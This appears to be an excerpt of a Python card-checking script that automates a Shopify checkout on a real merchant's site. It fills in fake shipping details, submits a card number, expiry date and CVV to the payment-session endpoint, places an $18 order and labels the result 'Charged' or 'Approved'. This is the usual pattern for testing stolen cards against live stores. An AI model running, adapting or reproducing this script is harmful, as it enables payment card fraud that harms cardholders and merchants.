...
def thisworks(cc, mes, ano, cvv):
    try:
        ...
        dataa = {'id': '41421715898507'}
        session.get(url='https://us.thisworks.com/cart/add.js',params= dataa)
        
        req_1 = session.get(url='https://us.thisworks.com/checkout')
        urlch = req_1.url

        data2 = f'_method=patch&authenticity_token={token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D={mail}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Battributes%5D%5Bmarketing_preferences%5D=undefined&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Juan&checkout%5Bshipping_address%5D%5Blast_name%5D={username}&checkout%5Bshipping_address%5D%5Baddress1%5D=street+234&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=NY&checkout%5Bshipping_address%5D%5Bcountry%5D=US&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10001&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Battributes%5D%5Bcustomer_title%5D=mr&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Juan&checkout%5Bshipping_address%5D%5Blast_name%5D={username}&checkout%5Bshipping_address%5D%5Baddress1%5D=street+234&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=NY&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10001&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1073&checkout%5Bclient_details%5D%5Bbrowser_height%5D=991&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
        ...
        data3 = f'_method=patch&authenticity_token={token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Free%2520Ground%2520Shipping%2520%282%2520-%25206%2520Business%2520Days%29-0.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1090&checkout%5Bclient_details%5D%5Bbrowser_height%5D=991&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
        session.post(urlch,data3,headers)

        data4= {"credit_card": {"number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}","name": username,"month": mes,"year": ano,"verification_value": cvv},"payment_session_scope": 'us.thisworks.com'}
        req_2 =session.post(url= 'https://deposit.us.shopifycs.com/sessions', json=data4)
        id_west = req_2.json()['id']
        
        data5 = f'_method=patch&authenticity_token={token}&previous_step=payment_method&step=&s={id_west}&checkout%5Bpayment_gateway%5D=44263211147&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=&checkout%5Bpost_purchase_page_requested%5D=0&checkout%5Btotal_price%5D=1800&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1090&checkout%5Bclient_details%5D%5Bbrowser_height%5D=991&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
        ...
        elif 'Charged' == resultados: return resultados,'Charged 18,00$ ✅'
        elif '/thank_you' in str(req_5.url) or '/orders/' in str(req_5.url) or '/post_purchase' in str(req_5.url): return  'Charged 18.00','Approved ✅'
